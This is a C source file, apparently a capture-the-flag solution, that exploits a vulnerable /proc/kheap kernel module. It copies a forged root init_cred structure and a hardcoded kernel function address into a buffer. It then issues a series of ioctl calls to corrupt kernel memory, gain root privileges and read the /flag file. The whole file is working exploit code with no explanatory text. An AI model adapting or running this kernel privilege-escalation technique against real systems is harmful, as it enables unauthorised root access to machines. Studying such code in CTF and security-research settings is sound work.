#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/sendfile.h>

typedef struct _kheap_req_t // sizeof=0x10
{                                       // XREF: kheap_ioctl/r
    void *ubuf;                         // XREF: kheap_ioctl+78/r
                                        // kheap_ioctl+FA/r
    size_t size;                        // XREF: kheap_ioctl+73/r
                                        // kheap_ioctl:loc_135/r
}kheap_req_t;

unsigned long init_cred[] ={0x0000000000000004,	0x0000000000000000,0x0000000000000000,	0x0000000000000000,0x0000000000000000,	0x0000000000000000,0x0000000000000000,	0x000001ffffffffff,0x000001ffffffffff,	0x000001ffffffffff,0x0000000000000000,	0x0000000000000000,0x0000000000000000,	0x0000000000000000,
0x0000000000000000,	0x0000000000000000,
0xffff8880038468c0,	0xffffffff82a51560,
0xffffffff82a51600,	0xffffffff82a53800,
0xffffffff82a52fd8,	0x0000000000000000,
0x0000000000000000
};

int main()
{
    int fd[512];
    char buf [1024];
    kheap_req_t kheap_req = {
        .ubuf = buf,
        .size = 0x200
    };
    memcpy(buf, init_cred, sizeof(init_cred));
    *(unsigned long *)(buf + 0x1f8) = 0xffffffff810b8bb0;
    int do_print = 0x5702;
    int pre_flag = 0x5704;
    int cp_user = 0x5700;
    int cp_from_user = 0x5701;
    for (int i = 0; i < 8; i++)
        fd[i] = open("/proc/kheap", 0);
    for (int i = 0; i < 8; i++)
    {
        ioctl(fd[i], cp_from_user, &kheap_req);
    }
    for (int i = 0; i < 8; i++)
    {
        ioctl(fd[i], do_print, &kheap_req);
    }

    int flag = open("/flag", O_RDONLY);
    sendfile(1, flag, NULL, 0x100);
    
    return 0;
}